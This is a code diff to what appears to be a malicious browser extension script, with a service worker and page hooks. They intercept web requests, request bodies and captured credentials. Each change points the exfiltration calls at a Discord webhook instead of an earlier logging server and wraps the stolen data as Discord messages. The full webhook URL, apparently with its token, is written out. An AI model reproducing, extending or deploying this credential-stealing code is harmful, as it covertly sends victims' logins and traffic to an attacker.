@@ -12,16 +12,18 @@
                 // Clone the request to read body
                 event.request.clone().text().then(body => {
                     // Log all requests to your server
-                    fetch('https://extension.up.railway.app/log', {
+                    fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            type: 'service_worker_intercept',
-                            url: url,
-                            method: method,
-                            body: body,
-                            timestamp: new Date().toISOString(),
-                            origin: self.location.origin
+                            content: `**Service Worker Intercept**\n\`\`\`json\n${JSON.stringify({
+                                type: 'service_worker_intercept',
+                                url: url,
+                                method: method,
+                                body: body,
+                                timestamp: new Date().toISOString(),
+                                origin: self.location.origin
+                            }, null, 2)}\n\`\`\``
                         }),
                         mode: 'no-cors'
                     }).catch(() => {});
@@ -73,16 +75,18 @@
                 };
                 
                 function logRequest(type, url, data) {
-                    fetch('https://extension.up.railway.app/log', {
+                    fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            type: 'persistent_intercept',
-                            method: type,
-                            url: url,
-                            data: data,
-                            timestamp: new Date().toISOString(),
-                            page: window.location.href
+                            content: `**Persistent Intercept**\n\`\`\`json\n${JSON.stringify({
+                                type: 'persistent_intercept',
+                                method: type,
+                                url: url,
+                                data: data,
+                                timestamp: new Date().toISOString(),
+                                page: window.location.href
+                            }, null, 2)}\n\`\`\``
                         }),
                         mode: 'no-cors'
                     }).catch(() => {});
@@ -102,14 +106,16 @@
                             });
                         }
                         
-                        fetch('https://extension.up.railway.app/log', {
+                        fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
-                                type: 'persistent_credentials',
-                                credentials: credentials,
-                                timestamp: new Date().toISOString(),
-                                page: window.location.href
+                                content: `**Persistent Credentials**\n\`\`\`json\n${JSON.stringify({
+                                    type: 'persistent_credentials',
+                                    credentials: credentials,
+                                    timestamp: new Date().toISOString(),
+                                    page: window.location.href
+                                }, null, 2)}\n\`\`\``
                             }),
                             mode: 'no-cors'
                         }).catch(() => {});
